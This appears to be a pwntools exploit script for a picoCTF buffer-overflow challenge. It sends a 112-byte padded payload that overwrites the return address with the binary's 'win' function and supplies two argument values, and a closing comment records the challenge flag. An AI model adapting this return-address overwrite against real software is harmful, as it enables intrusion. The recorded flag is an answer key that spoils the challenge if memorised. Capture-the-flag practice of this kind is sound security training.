from pwn import *

r = process("./vuln")
gdb.attach(r, gdbscript = '''
           b*win+118
           b*win+127
           c
           ''')
# r = remote("saturn.picoctf.net", 59769)
input()
exe = ELF("./vuln")
payload  = b"".ljust(112) + p32(exe.sym['win']) + b"aaaa" + p32(0xcafef00d) + p32(0xf00df00d)
r.recvline()
r.sendline(payload)
r.interactive()

#picoCTF{argum3nt5_4_d4yZ_b3fd8f66}